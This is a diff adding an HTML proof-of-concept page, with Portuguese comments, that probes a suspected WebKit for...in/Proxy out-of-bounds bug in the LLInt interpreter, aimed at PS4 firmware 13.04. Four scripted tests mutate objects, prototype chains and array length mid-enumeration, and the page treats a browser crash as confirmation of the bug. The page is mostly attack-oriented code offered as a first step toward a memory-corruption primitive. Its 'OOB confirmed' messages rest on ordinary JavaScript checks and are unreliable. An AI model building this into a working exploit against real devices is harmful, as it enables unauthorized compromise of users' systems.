@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<!--
+  PoC: JSPropertyNameEnumerator OOB — LLInt (sem JIT)
+
+  DESCRIÇÃO:
+  O JSPropertyNameEnumerator não verifica o tamanho final do objeto
+  base após iterar pelo prototype chain com um ProxyObject.
+  O bug ocorre no bytecode handler do LLInt — o tier de interpretação
+  pura que SEMPRE está ativo, independente de JIT.
+
+  MECANISMO:
+  - for...in com Proxy no prototype chain
+  - O Proxy modifica o objeto base durante a enumeração
+  - O enumerador não revalida o tamanho do objeto
+  - Resultado: acesso OOB à estrutura interna do objeto
+
+  PRIMITIVA: OOB read/write potencial via for...in + Proxy
+  SEM JIT: funciona no LLInt — aplicável ao PS4
+
+  STATUS PS4 FW 13.04: Variantes dessa classe continuam aparecendo
+  no WebKit. Nunca testado em 13.x.
+-->
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>JSPropertyNameEnumerator OOB — LLInt</title>
+<style>
+  body{background:#0a0a0a;color:#ccc;font-family:monospace;padding:16px;margin:0;font-size:13px}
+  #log{background:#111;border:1px solid #333;padding:10px;height:76vh;overflow-y:auto;font-size:11px;line-height:1.8}
+  .ok{color:#00ff88}.fail{color:#ff4444}.info{color:#ffcc44}.warn{color:#ff8844}
+  .vuln{color:#ff44ff;font-weight:bold}.patched{color:#44aaff}.dim{color:#555}
+  .bar{background:#0a1a0a;border:1px solid #1a3a1a;color:#44aa44;padding:6px 10px;margin-bottom:8px;font-size:11px}
+</style>
+</head>
+<body>
+<div style="color:#aaa;font-size:12px;margin-bottom:6px">JSPropertyNameEnumerator OOB · LLInt sem JIT · FW 13.04</div>
+<div class="bar" id="bar">Iniciando...</div>
+<div id="log"></div>
+<script>
+"use strict";
+var logEl=document.getElementById('log'),barEl=document.getElementById('bar');
+function L(m,c){logEl.innerHTML+='<div class="'+(c||'dim')+'">'+m+'</div>';logEl.scrollTop=logEl.scrollHeight;}
+function bar(m){barEl.textContent=m;}
+
+function run(){
+  L('JSPropertyNameEnumerator OOB — LLInt (sem JIT, PS4 compatível)','info');
+  L('Classe de bug for...in + Proxy + prototype chain. Testando FW 13.04...','info');
+  L('','');
+
+  // ── Teste 1: Proxy no prototype chain + modificação durante for...in ──
+  L('[1/4] Proxy no prototype chain com modificação durante enumeração...','warn');
+  bar('[1/4] Testando for...in + Proxy...');
+  setTimeout(function(){
+    try {
+      if(typeof Proxy==='undefined'){
+        L('[1/4] Proxy não suportado','fail');
+        bar('NÃO SUPORTADO'); return;
+      }
+
+      var anomalyCount=0;
+      var target={a:1,b:2,c:3,d:4,e:5};
+
+      // Proxy que modifica o objeto base durante ownKeys
+      var handler={
+        ownKeys:function(t){
+          // Adicionar propriedades extras durante enumeração
+          t.f=6; t.g=7; t.h=8;
+          return Object.keys(t);
+        },
+        getOwnPropertyDescriptor:function(t,k){
+          return {value:t[k],writable:true,enumerable:true,configurable:true};
+        }
+      };
+
+      var proxy=new Proxy(target,handler);
+      var obj=Object.create(proxy);
+      obj.x=10; obj.y=20;
+
+      var keys=[];
+      for(var k in obj) keys.push(k);
+
+      L('[1/4] Keys via for...in: ['+keys.join(',')+']','info');
+
+      // Verificar se enumerou além do esperado (OOB potencial)
+      var expected=['x','y','a','b','c','d','e','f','g','h'];
+      var extra=keys.filter(function(k){return expected.indexOf(k)===-1;});
+      if(extra.length>0){
+        L('[1/4] Keys extras inesperadas: ['+extra.join(',')+'] — OOB POSSÍVEL!','vuln');
+        anomalyCount++;
+      } else {
+        L('[1/4] Enumeração normal ✓','ok');
+      }
+    }catch(e){L('[1/4] Exceção: '+e,'warn');}
+
+    // ── Teste 2: Proxy deletando propriedades durante for...in ──────
+    L('','');
+    L('[2/4] Proxy deletando propriedades durante enumeração...','warn');
+    bar('[2/4] Proxy delete durante for...in...');
+    setTimeout(function(){
+      try {
+        var base={p0:0,p1:1,p2:2,p3:3,p4:4,p5:5,p6:6,p7:7};
+        var deleteCount=0;
+        var accessed=[];
+
+        var h2={
+          get:function(t,k){
+            if(k!=='length' && k!=='__proto__' && typeof k==='string'){
+              // Deletar a próxima propriedade durante o get
+              var keys=Object.keys(t);
+              var idx=keys.indexOf(k);
+              if(idx>=0 && idx<keys.length-1){
+                delete t[keys[idx+1]];
+                deleteCount++;
+              }
+            }
+            return t[k];
+          }
+        };
+
+        var p2=new Proxy(base,h2);
+        for(var k in p2) accessed.push(k);
+
+        L('[2/4] Propriedades acessadas: ['+accessed.join(',')+']','info');
+        L('[2/4] Deletes durante enumeração: '+deleteCount,'info');
+
+        // Verificar se acessou propriedade deletada (UAF de enumerador)
+        var deletedAccessed=accessed.filter(function(k){
+          return !(k in base);
+        });
+        if(deletedAccessed.length>0){
+          L('[2/4] Acessou propriedades já deletadas: ['+deletedAccessed.join(',')+'] — ENUMERATOR OOB!','vuln');
+        } else {
+          L('[2/4] Sem acesso a propriedades deletadas ✓','ok');
+        }
+      }catch(e){L('[2/4] Exceção: '+e,'warn');}
+
+      // ── Teste 3: Array + Proxy com length manipulation ───────────
+      L('','');
+      L('[3/4] Array com Proxy + manipulação de length durante for...in...','warn');
+      bar('[3/4] Array length manipulation...');
+      setTimeout(function(){
+        try {
+          var arr=[10,20,30,40,50,60,70,80];
+          var origLen=arr.length;
+          var oobReads=[];
+
+          var h3={
+            get:function(t,k){
+              var v=t[k];
+              // Expandir array durante leitura
+              if(k==='2'){ t.length=100; }
+              return v;
+            }
+          };
+
+          var pa=new Proxy(arr,h3);
+          var items=[];
+          for(var k in pa){
+            var v=pa[k];
+            items.push({k:k,v:v});
+            // Se acessou índice além do original — potencial OOB
+            if(parseInt(k)>=origLen){
+              oobReads.push(k+'='+v);
+            }
+          }
+
+          if(oobReads.length>0){
+            L('[3/4] Acessos OOB detectados: ['+oobReads.slice(0,5).join(',')+'] — OOB CONFIRMADO!','vuln');
+          } else {
+            L('[3/4] Sem OOB no array com Proxy ✓','ok');
+          }
+          L('[3/4] Total itens enumerados: '+items.length+' (original: '+origLen+')','info');
+        }catch(e){L('[3/4] Exceção: '+e,'warn');}
+
+        // ── Teste 4: Stress com prototype chain profunda ─────────────
+        L('','');
+        L('[4/4] Stress: prototype chain profunda + Proxy em cada nível...','warn');
+        L('[4/4] SE O BROWSER FECHAR = BUG PRESENTE','vuln');
+        bar('[4/4] Stress test...');
+        setTimeout(function(){
+          try {
+            // Construir chain de 10 níveis com Proxy
+            var chain=null;
+            for(var i=0;i<10;i++){
+              var level={};
+              level['prop'+i]=i*1.1;
+              var ph={
+                ownKeys:function(t){
+                  // Modificar objeto pai durante ownKeys
+                  if(chain) chain['injected'+Math.random()]=99;
+                  return Object.keys(t);
+                },
+                getOwnPropertyDescriptor:function(t,k){
+                  return {value:t[k],writable:true,enumerable:true,configurable:true};
+                }
+              };
+              var pLevel=new Proxy(level,ph);
+              if(chain===null){
+                chain=pLevel;
+              } else {
+                Object.setPrototypeOf(level,chain);
+                chain=pLevel;
+              }
+            }
+
+            var leaf={x:1,y:2,z:3};
+            Object.setPrototypeOf(leaf,chain);
+
+            var allKeys=[];
+            try{
+              for(var k in leaf) allKeys.push(k);
+            }catch(e2){
+              L('[4/4] Exceção durante for...in na chain: '+e2,'vuln');
+            }
+
+            L('[4/4] Total chaves enumeradas na chain de 10 níveis: '+allKeys.length,'info');
+            if(allKeys.length>1000){
+              L('[4/4] MAIS DE 1000 CHAVES — enumerador em loop infinito!','vuln');
+            } else {
+              L('[4/4] Enumeração controlada ✓','ok');
+            }
+          }catch(e){L('[4/4] Exceção: '+e,'warn');}
+
+          L('','');
+          L('══════════════════════════════════','warn');
+          L('CRASH = JSPropertyNameEnumerator OOB PRESENTE','vuln');
+          L('OOB reads = primitiva detectada','vuln');
+          L('Tudo normal = PATCHED','patched');
+          L('══════════════════════════════════','warn');
+          bar('DONE');
+        },300);
+      },300);
+    },300);
+  },200);
+}
+window.addEventListener('load',function(){setTimeout(run,300);});
+</script>
+</body>
+</html>
